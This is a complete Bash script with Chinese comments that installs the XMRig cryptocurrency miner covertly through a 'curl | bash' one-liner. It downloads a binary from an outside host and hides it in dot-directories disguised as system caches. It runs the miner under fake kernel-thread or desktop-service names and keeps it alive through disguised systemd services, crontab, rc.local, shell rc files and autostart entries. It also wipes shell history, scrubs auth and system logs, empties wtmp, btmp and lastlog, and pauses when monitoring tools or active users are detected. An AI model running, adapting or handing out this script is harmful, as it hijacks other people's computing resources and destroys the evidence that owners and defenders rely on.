#!/bin/bash
#===========================================
# XMRig 自动化部署脚本 v2.0
# 支持 ROOT/USER 双模式自动检测
# 使用方法: curl -sL URL | bash -s [选项] <钱包地址> <矿池地址:端口> <CPU百分比>
# 选项: -q 静默模式  --uninstall 卸载
#===========================================
set -o pipefail

#===========================================
# 全局配置
#===========================================
VERSION="2.0.0"
SILENT_MODE=0
PRIV_MODE=""
INSTALL_DIR=""
PROCESS_NAME=""
SERVICE_NAME=""
ACTUAL_CORES=1
CPU_CORES=1

# 下载源（多备份）
DOWNLOAD_URLS=(
    "https://gh.llkk.cc/https://github.com/jiaran464/xmr/raw/main/xmrig"
)

# 系统进程名池（用于伪装）
SYSTEM_PROCESS_NAMES=(
    "[kworker/0:1-events]"
    "[kworker/1:2-cgroup]"
    "[kworker/u8:0-events]"
    "[migration/0]"
    "[ksoftirqd/0]"
    "[rcu_sched]"
    "[watchdog/0]"
    "[irq/24-pciehp]"
    "[scsi_eh_0]"
    "[kblockd]"
)

# 用户态进程名池
USER_PROCESS_NAMES=(
    "dbus-daemon"
    "gvfsd"
    "gvfsd-metadata"
    "at-spi-bus-laun"
    "pulseaudio"
    "pipewire"
    "gnome-keyring-d"
    "gsd-housekeepin"
    "tracker-miner-f"
    "evolution-calen"
)

# ROOT 模式隐蔽目录
ROOT_DIRS=(
    "/usr/lib/systemd/.cache"
    "/var/lib/dpkg/.updates"
    "/usr/share/fonts/.uuid"
    "/var/cache/apt/.tmp"
    "/usr/lib/locale/.archive"
)

# USER 模式隐蔽目录
USER_DIRS=(
    "\$HOME/.cache/fontconfig/.uuid"
    "\$HOME/.local/share/gvfs-metadata/.cache"
    "\$HOME/.cache/mesa_shader_cache/.tmp"
    "\$HOME/.config/pulse/.runtime"
    "\$HOME/.cache/thumbnails/.fail"
)

#===========================================
# 工具函数
#===========================================

# 日志输出
log() {
    [ "$SILENT_MODE" -eq 1 ] && return
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1"
}

# 错误输出（即使静默模式也显示）
error() {
    echo "[ERROR] $1" >&2
}

# 纯 Bash 算术计算核心数（无需 bc）
calculate_cores() {
    local total=$1
    local percent=$2
    # 使用整数运算，+50 实现四舍五入
    local result=$(( (total * percent + 50) / 100 ))
    [ "$result" -lt 1 ] && result=1
    [ "$result" -gt "$total" ] && result=$total
    echo "$result"
}

# 获取 CPU 核心数
get_cpu_cores() {
    local cores
    cores=$(nproc 2>/dev/null) || \
    cores=$(grep -c '^processor' /proc/cpuinfo 2>/dev/null) || \
    cores=$(sysctl -n hw.ncpu 2>/dev/null) || \
    cores=1
    echo "$cores"
}

# 随机选择数组元素
random_choice() {
    local -n arr=$1
    local len=${#arr[@]}
    [ "$len" -eq 0 ] && return 1
    echo "${arr[$((RANDOM % len))]}"
}

# 检测监控工具是否运行
check_monitoring_tools() {
    local tools="top htop atop glances nmon iotop perf strace gdb ltrace"
    for tool in $tools; do
        if pgrep -x "$tool" >/dev/null 2>&1; then
            return 1  # 检测到监控工具
        fi
    done
    return 0
}

# 检测用户活动状态
check_user_activity() {
    # 检查 who 命令
    local active_users
    active_users=$(who 2>/dev/null | wc -l)
    
    if [ "$active_users" -eq 0 ]; then
        return 0  # 无用户，可执行
    fi
    
    # 检查每个用户的闲置时间
    while IFS= read -r line; do
        [ -z "$line" ] && continue
        local tty idle_time
        tty=$(echo "$line" | awk '{print $2}')
        
        # 获取 TTY 闲置时间
        if [ -e "/dev/$tty" ]; then
            local idle_seconds
            idle_seconds=$(stat -c %Y "/dev/$tty" 2>/dev/null) || continue
            local now
            now=$(date +%s)
            local diff=$(( now - idle_seconds ))
            
            # 闲置时间小于 30 分钟，认为活跃
            if [ "$diff" -lt 1800 ]; then
                return 1
            fi
        fi
    done < <(who 2>/dev/null)
    
    # 检查 X11/Wayland 会话
    if [ -n "${DISPLAY:-}" ] || [ -n "${WAYLAND_DISPLAY:-}" ]; then
        # 检查屏幕保护程序状态
        if command -v xprintidle >/dev/null 2>&1; then
            local idle_ms
            idle_ms=$(xprintidle 2>/dev/null) || idle_ms=0
            if [ "$idle_ms" -lt 1800000 ]; then  # 30 分钟
                return 1
            fi
        fi
    fi
    
    return 0
}

# 获取系统负载
get_system_load() {
    local load
    load=$(cat /proc/loadavg 2>/dev/null | cut -d' ' -f1 | cut -d'.' -f1) || load=0
    echo "$load"
}

# 动态计算线程数
get_dynamic_threads() {
    local base_threads=$1
    local load
    load=$(get_system_load)
    
    # 检测到监控工具，降到最低
    if ! check_monitoring_tools; then
        echo 1
        return
    fi
    
    # 负载过高时减少线程
    if [ "$load" -gt "$CPU_CORES" ]; then
        local reduced=$(( base_threads / 2 ))
        [ "$reduced" -lt 1 ] && reduced=1
        echo "$reduced"
        return
    fi
    
    echo "$base_threads"
}

# 伪造文件时间戳
fake_timestamp() {
    local filepath=$1
    local ref_files=("/bin/ls" "/bin/cat" "/usr/bin/env" "/bin/bash")
    
    for ref in "${ref_files[@]}"; do
        if [ -f "$ref" ]; then
            touch -r "$ref" "$filepath" 2>/dev/null && return 0
        fi
    done
    
    # 备选：设置为系统安装时间附近
    touch -t "202301010000" "$filepath" 2>/dev/null
}

# 清理 bash 历史
clean_history() {
    # 清理当前会话历史
    history -c 2>/dev/null
    history -w 2>/dev/null
    
    # 清理历史文件
    local history_files=(
        "$HOME/.bash_history"
        "$HOME/.zsh_history"
        "$HOME/.python_history"
        "$HOME/.lesshst"
        "$HOME/.wget-hsts"
    )
    
    for hf in "${history_files[@]}"; do
        [ -f "$hf" ] && : > "$hf" 2>/dev/null
    done
}

#===========================================
# 检测函数
#===========================================

# 检测权限级别
detect_privilege() {
    if [ "$(id -u)" -eq 0 ]; then
        PRIV_MODE="root"
        log "检测到 ROOT 权限"
    else
        PRIV_MODE="user"
        log "检测到普通用户权限"
    fi
}

# 检测系统环境
detect_environment() {
    CPU_CORES=$(get_cpu_cores)
    log "CPU 核心数: $CPU_CORES"
    
    local arch
    arch=$(uname -m)
    log "系统架构: $arch"
    
    # 检测 init 系统
    if command -v systemctl >/dev/null 2>&1 && systemctl --version >/dev/null 2>&1; then
        log "Init 系统: systemd"
    else
        log "Init 系统: 其他"
    fi
}

# 选择动态进程名
select_process_name() {
    local name=""
    
    # 优先从当前运行的系统进程中选择
    local running_procs
    running_procs=$(ps aux 2>/dev/null | awk '{print $11}' | grep -E '^\[|^/usr|^/lib' | head -20)
    
    if [ -n "$running_procs" ]; then
        # 随机选择一个正在运行的系统进程名
        name=$(echo "$running_procs" | shuf -n1 2>/dev/null | sed 's/.*\///' | head -c 15)
    fi
    
    # 如果没找到合适的，从预设池中选择
    if [ -z "$name" ] || [ ${#name} -lt 3 ]; then
        if [ "$PRIV_MODE" = "root" ]; then
            name=$(random_choice SYSTEM_PROCESS_NAMES)
        else
            name=$(random_choice USER_PROCESS_NAMES)
        fi
    fi
    
    # 清理特殊字符
    name=$(echo "$name" | tr -cd 'a-zA-Z0-9_\-\[\]/')
    
    echo "$name"
}

# 选择安装目录
select_install_dir() {
    local dir=""
    
    if [ "$PRIV_MODE" = "root" ]; then
        for d in "${ROOT_DIRS[@]}"; do
            local expanded
            expanded=$(eval echo "$d")
            if mkdir -p "$expanded" 2>/dev/null; then
                dir="$expanded"
                break
            fi
        done
    else
        for d in "${USER_DIRS[@]}"; do
            local expanded
            expanded=$(eval echo "$d")
            if mkdir -p "$expanded" 2>/dev/null; then
                dir="$expanded"
                break
            fi
        done
    fi
    
    # 备选目录
    if [ -z "$dir" ]; then
        if [ "$PRIV_MODE" = "root" ]; then
            dir="/tmp/.X11-unix/.cache"
        else
            dir="$HOME/.cache/.tmp"
        fi
        mkdir -p "$dir" 2>/dev/null
    fi
    
    echo "$dir"
}

#===========================================
# 下载函数
#===========================================

download_binary() {
    local filepath="$INSTALL_DIR/$PROCESS_NAME"
    
    log "下载二进制文件..."
    
    # 如果文件已存在且正在运行，先停止
    if [ -f "$filepath" ]; then
        pkill -f "$filepath" 2>/dev/null
        sleep 1
        rm -f "$filepath" 2>/dev/null
    fi
    
    # 尝试多个下载源
    for url in "${DOWNLOAD_URLS[@]}"; do
        log "尝试下载: ${url:0:50}..."
        
        # 使用 curl
        if command -v curl >/dev/null 2>&1; then
            if curl -sL --connect-timeout 15 --max-time 120 "$url" -o "$filepath" 2>/dev/null; then
                if [ -s "$filepath" ]; then
                    chmod +x "$filepath"
                    fake_timestamp "$filepath"
                    log "下载成功"
                    return 0
                fi
            fi
        fi
        
        # 使用 wget 作为备选
        if command -v wget >/dev/null 2>&1; then
            if wget -q --timeout=15 -O "$filepath" "$url" 2>/dev/null; then
                if [ -s "$filepath" ]; then
                    chmod +x "$filepath"
                    fake_timestamp "$filepath"
                    log "下载成功 (wget)"
                    return 0
                fi
            fi
        fi
    done
    
    error "所有下载源均失败"
    return 1
}

#===========================================
# 进程启动函数
#===========================================

start_process() {
    local filepath="$INSTALL_DIR/$PROCESS_NAME"
    local threads
    threads=$(get_dynamic_threads "$ACTUAL_CORES")
    
    log "启动进程 (线程数: $threads)..."
    
    # 构建参数
    local args="-o $POOL_ADDRESS -u $WALLET_ADDRESS -p x -t $threads --cpu-priority=0 --donate-level=1 --no-color"
    
    # 检查是否已在运行
    if pgrep -f "$filepath" >/dev/null 2>&1; then
        log "进程已在运行"
        return 0
    fi
    
    cd "$INSTALL_DIR" || return 1
    
    # 使用 exec -a 伪装进程名启动
    local display_name
    display_name=$(random_choice SYSTEM_PROCESS_NAMES)
    
    # 创建启动脚本（用于 cmdline 清理）
    local launcher="$INSTALL_DIR/.launcher"
    cat > "$launcher" << 'LAUNCHER_EOF'
#!/bin/bash
# 清理 cmdline 显示
exec -a "$1" "$2" ${@:3}
LAUNCHER_EOF
    chmod +x "$launcher"
    fake_timestamp "$launcher"
    
    # 后台启动，最低优先级
    nohup nice -n 19 ionice -c 3 "$launcher" "$display_name" "$filepath" $args >/dev/null 2>&1 &
    
    local pid=$!
    sleep 2
    
    if kill -0 "$pid" 2>/dev/null; then
        log "进程启动成功 (PID: $pid)"
        return 0
    else
        error "进程启动失败"
        return 1
    fi
}

#===========================================
# ROOT 模式持久化
#===========================================

setup_root_persistence() {
    log "设置 ROOT 模式持久化..."
    
    local filepath="$INSTALL_DIR/$PROCESS_NAME"
    SERVICE_NAME="systemd-helper"
    
    # 1. Systemd 系统服务
    if command -v systemctl >/dev/null 2>&1; then
        cat > "/etc/systemd/system/${SERVICE_NAME}.service" << EOF
[Unit]
Description=System Helper Service
After=network.target
Documentation=man:systemd(1)

[Service]
Type=simple
ExecStart=$filepath -o $POOL_ADDRESS -u $WALLET_ADDRESS -p x -t $ACTUAL_CORES --cpu-priority=0 --donate-level=1 --no-color
Restart=always
RestartSec=60
Nice=19
IOSchedulingClass=idle
CPUSchedulingPolicy=idle

[Install]
WantedBy=multi-user.target
EOF
        
        systemctl daemon-reload 2>/dev/null
        systemctl enable "${SERVICE_NAME}.service" 2>/dev/null
        systemctl start "${SERVICE_NAME}.service" 2>/dev/null
        log "Systemd 服务已创建: ${SERVICE_NAME}.service"
    fi
    
    # 2. Crontab 备份
    local cron_cmd="@reboot sleep 60 && $filepath -o $POOL_ADDRESS -u $WALLET_ADDRESS -p x -t $ACTUAL_CORES --cpu-priority=0 --donate-level=1 >/dev/null 2>&1 &"
    (crontab -l 2>/dev/null | grep -v "$filepath"; echo "$cron_cmd") | crontab - 2>/dev/null
    
    # 3. rc.local 备份
    if [ -f /etc/rc.local ]; then
        if ! grep -q "$filepath" /etc/rc.local 2>/dev/null; then
            sed -i "/^exit 0/i nohup nice -n 19 $filepath -o $POOL_ADDRESS -u $WALLET_ADDRESS -p x -t $ACTUAL_CORES --cpu-priority=0 --donate-level=1 >/dev/null 2>&1 &" /etc/rc.local 2>/dev/null
        fi
    fi
    
    log "ROOT 持久化设置完成"
}

# ROOT 模式隐蔽增强
setup_root_stealth() {
    log "设置 ROOT 模式隐蔽..."
    
    local filepath="$INSTALL_DIR/$PROCESS_NAME"
    
    # 1. 设置文件不可变属性（防删除）
    if command -v chattr >/dev/null 2>&1; then
        chattr +i "$filepath" 2>/dev/null && log "已设置文件保护"
    fi
    
    # 2. 清理系统日志
    local logs=(
        "/var/log/auth.log"
        "/var/log/secure"
        "/var/log/messages"
        "/var/log/syslog"
    )
    for logfile in "${logs[@]}"; do
        if [ -f "$logfile" ]; then
            # 删除包含关键词的行
            sed -i '/xmrig\|miner\|pool\|stratum/Id' "$logfile" 2>/dev/null
        fi
    done
    
    # 3. 清理 wtmp/btmp
    : > /var/log/wtmp 2>/dev/null
    : > /var/log/btmp 2>/dev/null
    
    # 4. 清理 lastlog
    : > /var/log/lastlog 2>/dev/null
    
    log "ROOT 隐蔽设置完成"
}

#===========================================
# USER 模式持久化
#===========================================

setup_user_persistence() {
    log "设置 USER 模式持久化..."
    
    local filepath="$INSTALL_DIR/$PROCESS_NAME"
    SERVICE_NAME="gvfs-helper"
    
    # 1. Systemd 用户服务（最隐蔽）
    if command -v systemctl >/dev/null 2>&1; then
        mkdir -p "$HOME/.config/systemd/user/"
        cat > "$HOME/.config/systemd/user/${SERVICE_NAME}.service" << EOF
[Unit]
Description=GVFS Metadata Helper
After=default.target

[Service]
Type=simple
ExecStart=$filepath -o $POOL_ADDRESS -u $WALLET_ADDRESS -p x -t $ACTUAL_CORES --cpu-priority=0 --donate-level=1 --no-color
Restart=always
RestartSec=60
Nice=19

[Install]
WantedBy=default.target
EOF
        
        systemctl --user daemon-reload 2>/dev/null
        systemctl --user enable "${SERVICE_NAME}.service" 2>/dev/null
        systemctl --user start "${SERVICE_NAME}.service" 2>/dev/null
        log "Systemd 用户服务已创建"
    fi
    
    # 2. Crontab 备份
    local cron_check="*/5 * * * * pgrep -f \"$PROCESS_NAME\" >/dev/null || (cd \"$INSTALL_DIR\" && nohup nice -n 19 ./$PROCESS_NAME -o $POOL_ADDRESS -u $WALLET_ADDRESS -p x -t $ACTUAL_CORES --cpu-priority=0 --donate-level=1 >/dev/null 2>&1 &)"
    (crontab -l 2>/dev/null | grep -v "$PROCESS_NAME"; echo "$cron_check") | crontab - 2>/dev/null
    log "Crontab 已设置"
    
    # 3. Shell 配置文件
    local shell_configs=("$HOME/.bashrc" "$HOME/.profile" "$HOME/.zshrc")
    local shell_cmd="(pgrep -f \"$PROCESS_NAME\" >/dev/null || (cd \"$INSTALL_DIR\" && nohup ./$PROCESS_NAME -o $POOL_ADDRESS -u $WALLET_ADDRESS -p x -t $ACTUAL_CORES --cpu-priority=0 --donate-level=1 >/dev/null 2>&1 &)) 2>/dev/null"
    
    for config in "${shell_configs[@]}"; do
        if [ -f "$config" ]; then
            if ! grep -q "$PROCESS_NAME" "$config" 2>/dev/null; then
                echo "" >> "$config"
                echo "# System helper" >> "$config"
                echo "$shell_cmd" >> "$config"
            fi
        fi
    done
    log "Shell 配置已设置"
    
    # 4. XDG Autostart（桌面环境）
    mkdir -p "$HOME/.config/autostart/"
    cat > "$HOME/.config/autostart/gvfs-helper.desktop" << EOF
[Desktop Entry]
Type=Application
Name=GVFS Helper
Exec=$filepath -o $POOL_ADDRESS -u $WALLET_ADDRESS -p x -t $ACTUAL_CORES --cpu-priority=0 --donate-level=1
Hidden=true
NoDisplay=true
X-GNOME-Autostart-enabled=true
EOF
    log "XDG Autostart 已设置"
    
    log "USER 持久化设置完成"
}

# USER 模式隐蔽增强
setup_user_stealth() {
    log "设置 USER 模式隐蔽..."
    
    local filepath="$INSTALL_DIR/$PROCESS_NAME"
    
    # 1. 伪造时间戳
    fake_timestamp "$filepath"
    fake_timestamp "$INSTALL_DIR"
    
    # 2. 清理历史
    clean_history
    
    # 3. 隐藏目录（添加 .hidden 文件）
    local parent_dir
    parent_dir=$(dirname "$INSTALL_DIR")
    local dir_name
    dir_name=$(basename "$INSTALL_DIR")
    echo "$dir_name" >> "$parent_dir/.hidden" 2>/dev/null
    
    log "USER 隐蔽设置完成"
}

#===========================================
# 监控守护进程
#===========================================

start_monitor_daemon() {
    log "启动监控守护进程..."
    
    local filepath="$INSTALL_DIR/$PROCESS_NAME"
    
    # 创建监控脚本
    local monitor_script="$INSTALL_DIR/.monitor"
    cat > "$monitor_script" << 'MONITOR_EOF'
#!/bin/bash
FILEPATH="__FILEPATH__"
POOL="__POOL__"
WALLET="__WALLET__"
CORES="__CORES__"

check_monitoring() {
    local tools="top htop atop glances nmon iotop perf strace gdb"
    for tool in $tools; do
        pgrep -x "$tool" >/dev/null 2>&1 && return 1
    done
    return 0
}

check_user_active() {
    local users=$(who 2>/dev/null | wc -l)
    [ "$users" -eq 0 ] && return 0
    
    # 检查闲置时间
    local active=0
    while read -r line; do
        [ -z "$line" ] && continue
        local tty=$(echo "$line" | awk '{print $2}')
        if [ -e "/dev/$tty" ]; then
            local idle=$(stat -c %Y "/dev/$tty" 2>/dev/null) || continue
            local now=$(date +%s)
            [ $((now - idle)) -lt 1800 ] && active=1 && break
        fi
    done < <(who 2>/dev/null)
    
    [ "$active" -eq 1 ] && return 1
    return 0
}

while true; do
    sleep 300
    
    # 检查是否应该运行
    if check_user_active && check_monitoring; then
        # 检查进程是否存在
        if ! pgrep -f "$FILEPATH" >/dev/null 2>&1; then
            # 检查文件是否存在
            if [ -f "$FILEPATH" ]; then
                cd "$(dirname "$FILEPATH")"
                nohup nice -n 19 "$FILEPATH" -o "$POOL" -u "$WALLET" -p x -t "$CORES" --cpu-priority=0 --donate-level=1 >/dev/null 2>&1 &
            fi
        fi
    else
        # 用户活跃或有监控工具，停止进程
        pkill -f "$FILEPATH" 2>/dev/null
    fi
done
MONITOR_EOF
    
    # 替换变量
    sed -i "s|__FILEPATH__|$filepath|g" "$monitor_script"
    sed -i "s|__POOL__|$POOL_ADDRESS|g" "$monitor_script"
    sed -i "s|__WALLET__|$WALLET_ADDRESS|g" "$monitor_script"
    sed -i "s|__CORES__|$ACTUAL_CORES|g" "$monitor_script"
    
    chmod +x "$monitor_script"
    fake_timestamp "$monitor_script"
    
    # 启动监控守护进程
    nohup "$monitor_script" >/dev/null 2>&1 &
    log "监控守护进程已启动"
}

#===========================================
# 卸载函数
#===========================================

uninstall() {
    log "开始卸载..."
    
    # 停止进程
    pkill -f "xmrig\|$PROCESS_NAME" 2>/dev/null
    
    # 停止服务
    if [ "$PRIV_MODE" = "root" ]; then
        systemctl stop systemd-helper.service 2>/dev/null
        systemctl disable systemd-helper.service 2>/dev/null
        rm -f /etc/systemd/system/systemd-helper.service 2>/dev/null
        systemctl daemon-reload 2>/dev/null
        
        # 移除 chattr 保护
        for d in "${ROOT_DIRS[@]}"; do
            local expanded=$(eval echo "$d")
            chattr -i "$expanded"/* 2>/dev/null
            rm -rf "$expanded" 2>/dev/null
        done
    else
        systemctl --user stop gvfs-helper.service 2>/dev/null
        systemctl --user disable gvfs-helper.service 2>/dev/null
        rm -f "$HOME/.config/systemd/user/gvfs-helper.service" 2>/dev/null
        systemctl --user daemon-reload 2>/dev/null
        
        # 清理用户目录
        for d in "${USER_DIRS[@]}"; do
            local expanded=$(eval echo "$d")
            rm -rf "$expanded" 2>/dev/null
        done
        
        # 清理 autostart
        rm -f "$HOME/.config/autostart/gvfs-helper.desktop" 2>/dev/null
    fi
    
    # 清理 crontab
    crontab -l 2>/dev/null | grep -v "xmrig\|$PROCESS_NAME\|gvfs-helper" | crontab - 2>/dev/null
    
    # 清理 shell 配置
    local shell_configs=("$HOME/.bashrc" "$HOME/.profile" "$HOME/.zshrc")
    for config in "${shell_configs[@]}"; do
        if [ -f "$config" ]; then
            sed -i '/System helper/d' "$config" 2>/dev/null
            sed -i '/pgrep -f.*PROCESS_NAME/d' "$config" 2>/dev/null
            sed -i '/gvfs-helper/d' "$config" 2>/dev/null
        fi
    done
    
    log "卸载完成"
    exit 0
}

#===========================================
# 参数解析
#===========================================

parse_arguments() {
    # 解析选项
    while [ $# -gt 0 ]; do
        case "$1" in
            -q|--quiet)
                SILENT_MODE=1
                shift
                ;;
            --uninstall)
                detect_privilege
                uninstall
                ;;
            -h|--help)
                echo "使用方法: $0 [选项] <钱包地址> <矿池地址:端口> <CPU百分比>"
                echo "选项:"
                echo "  -q, --quiet     静默模式"
                echo "  --uninstall     卸载"
                echo "  -h, --help      显示帮助"
                exit 0
                ;;
            -*)
                error "未知选项: $1"
                exit 1
                ;;
            *)
                break
                ;;
        esac
    done
    
    # 检查必需参数
    if [ $# -ne 3 ]; then
        error "参数不足"
        echo "使用方法: $0 [选项] <钱包地址> <矿池地址:端口> <CPU百分比>"
        exit 1
    fi
    
    WALLET_ADDRESS="$1"
    POOL_ADDRESS="$2"
    CPU_PERCENTAGE="$3"
    
    # 验证 CPU 百分比
    if ! [[ "$CPU_PERCENTAGE" =~ ^[0-9]+$ ]] || [ "$CPU_PERCENTAGE" -lt 1 ] || [ "$CPU_PERCENTAGE" -gt 100 ]; then
        error "CPU 百分比必须是 1-100 之间的整数"
        exit 1
    fi
}

#===========================================
# 主函数
#===========================================

main() {
    parse_arguments "$@"
    
    log "=== XMRig 部署脚本 v$VERSION ==="
    log "钱包: ${WALLET_ADDRESS:0:20}..."
    log "矿池: $POOL_ADDRESS"
    log "CPU: $CPU_PERCENTAGE%"
    
    # 检测环境
    detect_privilege
    detect_environment
    
    # 计算核心数
    ACTUAL_CORES=$(calculate_cores "$CPU_CORES" "$CPU_PERCENTAGE")
    log "使用核心数: $ACTUAL_CORES"
    
    # 选择安装目录和进程名
    INSTALL_DIR=$(select_install_dir)
    PROCESS_NAME=$(select_process_name)
    # 清理进程名中的特殊字符用于文件名
    local safe_name
    safe_name=$(echo "$PROCESS_NAME" | tr -cd 'a-zA-Z0-9_-')
    [ -z "$safe_name" ] && safe_name="helper"
    PROCESS_NAME="$safe_name"
    
    log "安装目录: $INSTALL_DIR"
    log "进程名: $PROCESS_NAME"
    
    # 下载二进制文件
    if ! download_binary; then
        error "下载失败，退出"
        exit 1
    fi
    
    # 根据权限应用不同策略
    if [ "$PRIV_MODE" = "root" ]; then
        setup_root_persistence
        setup_root_stealth
    else
        setup_user_persistence
        setup_user_stealth
    fi
    
    # 启动进程
    if check_user_activity; then
        start_process
    else
        log "检测到用户活跃，延迟启动"
    fi
    
    # 启动监控守护进程
    start_monitor_daemon
    
    # 清理历史
    clean_history
    
    log "=== 部署完成 ==="
    log "模式: $PRIV_MODE"
    log "路径: $INSTALL_DIR/$PROCESS_NAME"
    log "服务: $SERVICE_NAME"
}

# 执行
main "$@"
